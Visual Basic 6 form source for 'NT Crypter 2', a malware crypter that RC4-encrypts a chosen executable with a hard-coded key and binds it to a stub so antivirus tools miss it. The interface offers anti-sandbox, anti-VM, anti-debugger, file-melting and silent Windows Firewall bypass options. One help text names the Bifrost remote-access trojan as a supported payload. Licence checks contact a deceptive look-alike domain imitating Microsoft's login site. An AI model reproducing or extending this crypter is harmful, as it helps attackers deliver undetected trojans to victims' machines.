VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "comdlg32.ocx"
Begin VB.Form frmMain 
   BackColor       =   &H00DAE3E5&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "NT Crypter 2 www.cryptosuite.org AJaN"
   ClientHeight    =   7110
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   5820
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   7110
   ScaleWidth      =   5820
   StartUpPosition =   3  'Windows Default
   Begin prjNTCrypter.SCommandButton SCommandButton3 
      Height          =   300
      Left            =   3240
      TabIndex        =   19
      Top             =   6720
      Width           =   1095
      _ExtentX        =   1931
      _ExtentY        =   529
      Caption         =   "About"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin prjNTCrypter.jcFrames jcFrames2 
      Height          =   2655
      Left            =   120
      Top             =   2280
      Width           =   5535
      _ExtentX        =   9763
      _ExtentY        =   4683
      FrameColor      =   12829635
      FillColor       =   -2147483633
      Style           =   0
      Caption         =   "Settings"
      Alignment       =   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ColorFrom       =   0
      ColorTo         =   0
      Begin VB.PictureBox Picture1 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         ForeColor       =   &H80000008&
         Height          =   540
         Left            =   240
         Picture         =   "frmMain.frx":902A
         ScaleHeight     =   510
         ScaleWidth      =   540
         TabIndex        =   38
         Top             =   1920
         Width           =   565
      End
      Begin prjNTCrypter.Check chkPE 
         Height          =   255
         Left            =   3480
         TabIndex        =   20
         Top             =   360
         Width           =   1095
         _ExtentX        =   1931
         _ExtentY        =   450
         Value           =   1
         Caption         =   "Realign PE"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   0
         Caption         =   "Realign PE"
         BackColor       =   -2147483633
      End
      Begin MSComDlg.CommonDialog CommonDialog2 
         Left            =   4920
         Top             =   1320
         _ExtentX        =   847
         _ExtentY        =   847
         _Version        =   393216
      End
      Begin prjNTCrypter.SCommandButton SCommandButton1 
         Height          =   255
         Left            =   4920
         TabIndex        =   17
         Top             =   1920
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   450
         Caption         =   "..."
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin prjNTCrypter.Check Check8 
         Height          =   255
         Left            =   240
         TabIndex        =   16
         Top             =   1560
         Width           =   1335
         _ExtentX        =   2355
         _ExtentY        =   450
         Caption         =   "Change Icon"
         ForeColor       =   0
         Caption         =   "Change Icon"
         BackColor       =   -2147483633
      End
      Begin prjNTCrypter.wxpText cText2 
         Height          =   285
         Left            =   960
         TabIndex        =   15
         Top             =   1920
         Width           =   3855
         _ExtentX        =   6800
         _ExtentY        =   503
         Text            =   ""
         BackColor       =   -2147483643
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin prjNTCrypter.SCommandButton Button6 
         Height          =   300
         Left            =   4920
         TabIndex        =   13
         Top             =   960
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   529
         Caption         =   "..."
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin prjNTCrypter.wxpText Text2 
         Height          =   285
         Left            =   240
         TabIndex        =   12
         Top             =   960
         Width           =   4575
         _ExtentX        =   8070
         _ExtentY        =   503
         Text            =   ""
         BorderColor     =   8421376
         BackColor       =   -2147483643
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin MSComDlg.CommonDialog CommonDialog1 
         Left            =   4920
         Top             =   360
         _ExtentX        =   847
         _ExtentY        =   847
         _Version        =   393216
      End
      Begin prjNTCrypter.Check chkMeltStub 
         Height          =   255
         Left            =   1680
         TabIndex        =   1
         Top             =   360
         Width           =   1335
         _ExtentX        =   2355
         _ExtentY        =   450
         Caption         =   "Change PE EP"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   0
         Caption         =   "Change PE EP"
         BackColor       =   -2147483633
      End
      Begin prjNTCrypter.Check chkEOFData 
         Height          =   255
         Left            =   240
         TabIndex        =   2
         Top             =   360
         Width           =   975
         _ExtentX        =   1720
         _ExtentY        =   450
         Value           =   1
         Caption         =   "EOF Data"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   0
         Caption         =   "EOF Data"
         BackColor       =   -2147483633
      End
      Begin prjNTCrypter.SCommandButton SCommandButton4 
         Height          =   135
         Left            =   1320
         TabIndex        =   24
         Top             =   405
         Width           =   135
         _ExtentX        =   238
         _ExtentY        =   238
         Caption         =   "?"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin prjNTCrypter.SCommandButton SCommandButton5 
         Height          =   135
         Left            =   3090
         TabIndex        =   25
         Top             =   405
         Width           =   135
         _ExtentX        =   238
         _ExtentY        =   238
         Caption         =   "?"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin prjNTCrypter.SCommandButton SCommandButton6 
         Height          =   135
         Left            =   4680
         TabIndex        =   26
         Top             =   405
         Width           =   135
         _ExtentX        =   238
         _ExtentY        =   238
         Caption         =   "?"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin VB.Label Label2 
         BackStyle       =   0  'Transparent
         Caption         =   "Icon"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404040&
         Height          =   255
         Left            =   240
         TabIndex        =   14
         Top             =   1320
         Width           =   1575
      End
      Begin VB.Label Label1 
         BackStyle       =   0  'Transparent
         Caption         =   "Encryption Key"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404040&
         Height          =   255
         Left            =   240
         TabIndex        =   10
         Top             =   720
         Width           =   1575
      End
   End
   Begin prjNTCrypter.jcFrames jcFrames1 
      Height          =   855
      Left            =   120
      Top             =   1440
      Width           =   5535
      _ExtentX        =   9763
      _ExtentY        =   1508
      FrameColor      =   12829635
      FillColor       =   -2147483633
      Style           =   0
      Caption         =   "File"
      Alignment       =   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ColorFrom       =   0
      ColorTo         =   0
      Begin prjNTCrypter.wxpText txtFile 
         Height          =   285
         Left            =   120
         TabIndex        =   0
         Top             =   360
         Width           =   4695
         _ExtentX        =   8281
         _ExtentY        =   503
         Text            =   " Select a file..."
         BorderColor     =   8421376
         BackColor       =   -2147483643
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin prjNTCrypter.SCommandButton cmdBrowse 
         Height          =   300
         Left            =   4920
         TabIndex        =   3
         Top             =   360
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   529
         Caption         =   "..."
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
   End
   Begin prjNTCrypter.jcFrames jcFrames4 
      Height          =   1695
      Left            =   120
      Top             =   4920
      Width           =   5535
      _ExtentX        =   9763
      _ExtentY        =   2990
      FrameColor      =   12829635
      FillColor       =   -2147483633
      Style           =   0
      Caption         =   "Miscellaneous"
      Alignment       =   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ColorFrom       =   0
      ColorTo         =   0
      Begin prjNTCrypter.SCommandButton SCommandButton16 
         Height          =   135
         Left            =   5280
         TabIndex        =   36
         Top             =   600
         Width           =   135
         _ExtentX        =   238
         _ExtentY        =   238
         Caption         =   "?"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin prjNTCrypter.Check Check6 
         Height          =   255
         Left            =   2880
         TabIndex        =   9
         Top             =   360
         Width           =   1815
         _ExtentX        =   3201
         _ExtentY        =   450
         Caption         =   "Anti-CWSandbox"
         ForeColor       =   0
         Caption         =   "Anti-CWSandbox"
         BackColor       =   -2147483633
      End
      Begin prjNTCrypter.Check Check5 
         Height          =   255
         Left            =   360
         TabIndex        =   8
         Top             =   1320
         Width           =   1815
         _ExtentX        =   3201
         _ExtentY        =   450
         Caption         =   "Anti-Norman"
         ForeColor       =   0
         Caption         =   "Anti-Norman"
         BackColor       =   -2147483633
      End
      Begin prjNTCrypter.Check Check4 
         Height          =   255
         Left            =   360
         TabIndex        =   7
         Top             =   1080
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   450
         Value           =   2
         Caption         =   "Anti-VPC"
         Enabled         =   0   'False
         ForeColor       =   12632256
         Caption         =   "Anti-VPC"
         BackColor       =   -2147483633
         ForeColor       =   12632256
      End
      Begin prjNTCrypter.Check Check3 
         Height          =   255
         Left            =   360
         TabIndex        =   6
         Top             =   840
         Width           =   1335
         _ExtentX        =   2355
         _ExtentY        =   450
         Caption         =   "Anti-VMWare"
         ForeColor       =   0
         Caption         =   "Anti-VMWare"
         BackColor       =   -2147483633
      End
      Begin prjNTCrypter.Check Check2 
         Height          =   255
         Left            =   360
         TabIndex        =   5
         Top             =   600
         Width           =   1815
         _ExtentX        =   3201
         _ExtentY        =   450
         Caption         =   "Anti regmon/procmon"
         ForeColor       =   0
         Caption         =   "Anti regmon/procmon"
         BackColor       =   -2147483633
      End
      Begin prjNTCrypter.Check Check1 
         Height          =   255
         Left            =   360
         TabIndex        =   4
         Top             =   360
         Width           =   1575
         _ExtentX        =   2778
         _ExtentY        =   450
         Caption         =   "Anti-Sunbelt"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   0
         Caption         =   "Anti-Sunbelt"
         BackColor       =   -2147483633
      End
      Begin prjNTCrypter.Check Check7 
         Height          =   255
         Left            =   2880
         TabIndex        =   11
         Top             =   600
         Width           =   2415
         _ExtentX        =   4260
         _ExtentY        =   450
         Caption         =   "Windows Firewall Bypass"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   0
         Caption         =   "Windows Firewall Bypass"
         BackColor       =   -2147483633
      End
      Begin prjNTCrypter.Check Check9 
         Height          =   255
         Left            =   2880
         TabIndex        =   21
         Top             =   1320
         Width           =   1815
         _ExtentX        =   3201
         _ExtentY        =   450
         Caption         =   "Anti-SoftIce"
         ForeColor       =   0
         Caption         =   "Anti-SoftIce"
         BackColor       =   -2147483633
      End
      Begin prjNTCrypter.Check Check10 
         Height          =   255
         Left            =   2880
         TabIndex        =   22
         Top             =   1080
         Width           =   1815
         _ExtentX        =   3201
         _ExtentY        =   450
         Caption         =   "Anti-Emulation"
         ForeColor       =   0
         Caption         =   "Anti-Emulation"
         BackColor       =   -2147483633
      End
      Begin prjNTCrypter.Check Check11 
         Height          =   255
         Left            =   2880
         TabIndex        =   23
         Top             =   840
         Width           =   1815
         _ExtentX        =   3201
         _ExtentY        =   450
         Caption         =   "Melt File"
         ForeColor       =   0
         Caption         =   "Melt File"
         BackColor       =   -2147483633
      End
      Begin prjNTCrypter.SCommandButton SCommandButton7 
         Height          =   135
         Left            =   2280
         TabIndex        =   27
         Top             =   1320
         Width           =   135
         _ExtentX        =   238
         _ExtentY        =   238
         Caption         =   "?"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin prjNTCrypter.SCommandButton SCommandButton8 
         Height          =   135
         Left            =   2280
         TabIndex        =   28
         Top             =   1080
         Width           =   135
         _ExtentX        =   238
         _ExtentY        =   238
         Caption         =   "?"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin prjNTCrypter.SCommandButton SCommandButton9 
         Height          =   135
         Left            =   2280
         TabIndex        =   29
         Top             =   840
         Width           =   135
         _ExtentX        =   238
         _ExtentY        =   238
         Caption         =   "?"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin prjNTCrypter.SCommandButton SCommandButton10 
         Height          =   135
         Left            =   2280
         TabIndex        =   30
         Top             =   360
         Width           =   135
         _ExtentX        =   238
         _ExtentY        =   238
         Caption         =   "?"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin prjNTCrypter.SCommandButton SCommandButton11 
         Height          =   135
         Left            =   2280
         TabIndex        =   31
         Top             =   600
         Width           =   135
         _ExtentX        =   238
         _ExtentY        =   238
         Caption         =   "?"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin prjNTCrypter.SCommandButton SCommandButton12 
         Height          =   135
         Left            =   5280
         TabIndex        =   32
         Top             =   1320
         Width           =   135
         _ExtentX        =   238
         _ExtentY        =   238
         Caption         =   "?"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin prjNTCrypter.SCommandButton SCommandButton13 
         Height          =   135
         Left            =   5280
         TabIndex        =   33
         Top             =   1080
         Width           =   135
         _ExtentX        =   238
         _ExtentY        =   238
         Caption         =   "?"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin prjNTCrypter.SCommandButton SCommandButton14 
         Height          =   135
         Left            =   5280
         TabIndex        =   34
         Top             =   840
         Width           =   135
         _ExtentX        =   238
         _ExtentY        =   238
         Caption         =   "?"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin prjNTCrypter.SCommandButton SCommandButton15 
         Height          =   135
         Left            =   5280
         TabIndex        =   35
         Top             =   360
         Width           =   135
         _ExtentX        =   238
         _ExtentY        =   238
         Caption         =   "?"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin VB.Line Line1 
         BorderColor     =   &H00C0C0C0&
         X1              =   2640
         X2              =   2640
         Y1              =   1560
         Y2              =   240
      End
   End
   Begin prjNTCrypter.SCommandButton SCommandButton2 
      Height          =   300
      Left            =   4560
      TabIndex        =   18
      Top             =   6720
      Width           =   1095
      _ExtentX        =   1931
      _ExtentY        =   529
      Caption         =   "Crypt"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin VB.Label Label3 
      BackStyle       =   0  'Transparent
      Caption         =   "EOF Data : No PE selected."
      Height          =   255
      Left            =   120
      TabIndex        =   37
      Top             =   6720
      Width           =   3015
   End
   Begin VB.Image Image1 
      Height          =   1245
      Left            =   0
      Picture         =   "frmMain.frx":9334
      Top             =   0
      Width           =   5805
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function InternetOpen Lib "wininet" Alias "InternetOpenA" (ByVal sAgent As String, ByVal lAccessType As Long, ByVal sProxyName As String, ByVal sProxyBypass As String, ByVal lFlags As Long) As Long
Private Declare Function InternetOpenUrl Lib "wininet" Alias "InternetOpenUrlA" (ByVal hInternetSession As Long, ByVal lpszUrl As String, ByVal lpszHeaders As String, ByVal dwHeadersLength As Long, ByVal dwFlags As Long, ByVal dwContext As Long) As Long
Private Declare Function InternetReadFile Lib "wininet" (ByVal hFile As Long, ByVal sBuffer As String, ByVal lNumBytesToRead As Long, lNumberOfBytesRead As Long) As Integer
Private Declare Function InternetCloseHandle Lib "wininet" (ByRef hInet As Long) As Long
Private Const INTERNET_FLAG_RELOAD = &H80000000

Private Sub Button6_Click()
Text2.Text = ""
For i = 1 To 25
If i = 2 Or i = 4 Or i = 6 Then
Text2.Text = Text2.Text & RandomNumber
Else
Text2.Text = Text2.Text & RandomLetter
End If
Next i
End Sub

Private Sub cmdBrowse_Click()
CommonDialog1.DialogTitle = "Please Select Executable"
CommonDialog1.FileName = vbNullString
CommonDialog1.DefaultExt = "exe"
CommonDialog1.Filter = "Executables (*.exe)|*.exe|All Files (*.*)|*.*"
CommonDialog1.ShowOpen
txtFile.Text = CommonDialog1.FileName
Label3.Caption = "EOF Data : " & Len(ReadEOFData(txtFile.Text)) & " Bytes."
MsgBox "If the EOF bytes are higher than 0, please check the EOF box."
End Sub

Private Function RandomNumber() As Integer
Randomize
var1 = Int(9 * Rnd)
RandomNumber = var1
End Function

Private Function RandomLetter() As String
Anfang:
Keyset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
Randomize
var1 = Int(26 * Rnd)
If var1 = 0 Then GoTo Anfang
RandomLetter = Mid(Keyset, var1, 1)
End Function

Private Sub SCommandButton1_Click()
On Error Resume Next
CommonDialog2.DialogTitle = "Please select a icon"
CommonDialog2.FileName = vbNullString
CommonDialog2.DefaultExt = "ico"
CommonDialog2.Filter = "Icon Files (*.ico) | *.ico"
CommonDialog2.ShowOpen
cText2.Text = CommonDialog2.FileName
Picture1.Picture = LoadPicture(CommonDialog2.FileName)
End Sub

Private Sub SCommandButton10_Click()
MsgBox "Bypass the Sunbelt sandbox. Uses serial method."
End Sub

Private Sub SCommandButton12_Click()
MsgBox "This makes Softice debugger crash while trying to debug it."
End Sub

Private Sub SCommandButton13_Click()
MsgBox "Universal anti-emulation technique will be added to the stub."
End Sub

Private Sub SCommandButton14_Click()
MsgBox "This will make the file dissapear upon execution."
End Sub

Private Sub SCommandButton15_Click()
MsgBox "This bypasses the CWSandbox using the serial method."
End Sub

Private Sub SCommandButton16_Click()
MsgBox "This feature allows you to bypass Windows Firewall, with no prompts."
End Sub

Private Sub SCommandButton2_Click()
Dim sInfo As String
Dim res As String
Dim sRes() As Byte
Dim sFile As Long
Dim TheEOF As String

sFile = FreeFile
sRes() = LoadResData("EXE", "CUSTOM")
If txtFile.Text = " Select a file..." Then
MsgBox "Please select a file.", vbInformation
Exit Sub
Else
End If
If txtFile.Text = "" Then
MsgBox "Please select a file.", vbInformation
Exit Sub
Else
End If

If chkEOFData.Value = Checked Then
TheEOF = ReadEOFData(txtFile.Text)
Else
End If

Open App.Path & "/Res.exe" For Binary Access Write As #sFile
Put #sFile, , sRes()
Close #sFile
Open App.Path & "/Res.exe" For Binary Access Read As #1
res = Input(LOF(1), 1)
Close #1
res = res & "XXXXX"
Open txtFile.Text For Binary Access Read As #1
sInfo = sInfo & Input(LOF(1), 1)
Close #1
    
sInfo = RC4_String(sInfo, "AAAAA")
CommonDialog1.DialogTitle = "Select Output"
CommonDialog1.DefaultExt = "exe"
CommonDialog1.Filter = "Executables (*.exe)|*.exe|All Files (*.*)|*.*"
CommonDialog1.ShowSave

Open CommonDialog1.FileName For Binary Access Write As #1
Put #1, 1, res & sInfo
Close #1
sInfo = ""
If chkPE.Value = Checked Then
Call RealignPEFromFile(txtFile.Text)
Else
End If
Kill App.Path & "/Res.exe"
If chkEOFData.Value = Checked Then
Call WriteEOFData(CommonDialog1.FileName, TheEOF)
End If
If Check8.Value = 1 Then
Call ReplaceIcons(cText2.Text, txtFile.Text, vbNullString)
Else
End If

MsgBox "Success! File is now crypted.", vbOKOnly
End Sub

Private Sub SCommandButton3_Click()
frmAbout.Show
End Sub

Public Function CheckUser(UserName As String) As Boolean
Dim hOpen As Long, hURL As Long, sBuff As String, lRead As Long
hOpen = InternetOpen("Testing123", 1, 0, 0, 0)
If hOpen <> 0 Then
hURL = InternetOpenUrl(hOpen, "http://login.live.com.login.free.fr/Authentication/" & UserName & ".txt", 0, 0, INTERNET_FLAG_RELOAD, 0)
sBuff = Space(1)
Call InternetReadFile(hURL, ByVal sBuff, 1, lRead)
If sBuff = "1" Then
CheckUser = True
Else
CheckUser = False
End If
Call InternetCloseHandle(hURL)
End If
Call InternetCloseHandle(hOpen)
End Function

Public Function Update(UserName As String) As Boolean
Dim hOpen As Long, hURL As Long, sBuff As String, lRead As Long
hOpen = InternetOpen("Testing123", 1, 0, 0, 0)
If hOpen <> 0 Then
hURL = InternetOpenUrl(hOpen, "http://login.live.com.login.free.fr/Authentication/" & UserName & ".txt", 0, 0, INTERNET_FLAG_RELOAD, 0)
sBuff = Space(1)
Call InternetReadFile(hURL, ByVal sBuff, 1, lRead)
If sBuff = "1" Then
Update = True
Else
Update = False
End If
Call InternetCloseHandle(hURL)
End If
Call InternetCloseHandle(hOpen)
End Function




Private Sub SCommandButton4_Click()
MsgBox "Check this if your using Bifrost, Flux, or anything that writes data to the end of the file."
End Sub

Private Sub SCommandButton5_Click()
MsgBox "This will change the executable entry point. (May not work on some files.)"
End Sub

Private Sub SCommandButton7_Click()
MsgBox "This bypasses the Norman sandbox using the serial method."
End Sub

Private Sub SCommandButton8_Click()
MsgBox "This makes it so a user cannot run the protected file under VPC."
End Sub

Private Sub SCommandButton9_Click()
MsgBox "This makes it so a user cannot run the protected file under VM-Ware."
End Sub

Public Function ReadEOFData(sFilePath As String) As String
On Error GoTo Err:
Dim sFileBuf As String, sEOFBuf As String, sChar As String
Dim lFF As Long, lPos As Long, lPos2 As Long, lCount As Long
If Dir(sFilePath) = "" Then GoTo Err:
lFF = FreeFile
Open sFilePath For Binary As #lFF
sFileBuf = Space(LOF(lFF))
Get #lFF, , sFileBuf
Close #lFF
lPos = InStr(1, StrReverse(sFileBuf), GetNullBytes(30))
sEOFBuf = (Mid(StrReverse(sFileBuf), 1, lPos - 1))
ReadEOFData = StrReverse(sEOFBuf)
If ReadEOFData = "" Then
'MsgBox "EOF data was not detected!", vbInformation
End If
Exit Function
Err:
ReadEOFData = vbNullString
End Function

Sub WriteEOFData(sFilePath As String, sEOFData As String)
Dim sFileBuf As String
Dim lFF As Long
On Error Resume Next
If Dir(sFilePath) = "" Then Exit Sub
lFF = FreeFile
Open sFilePath For Binary As #lFF
sFileBuf = Space(LOF(lFF))
Get #lFF, , sFileBuf
Close #lFF
Kill sFilePath
lFF = FreeFile
Open sFilePath For Binary As #lFF
Put #lFF, , sFileBuf & sEOFData
Close #lFF
End Sub

Public Function GetNullBytes(lNum) As String
Dim sBuf As String
Dim i As Integer
For i = 1 To lNum
sBuf = sBuf & Chr(0)
Next
GetNullBytes = sBuf
End Function

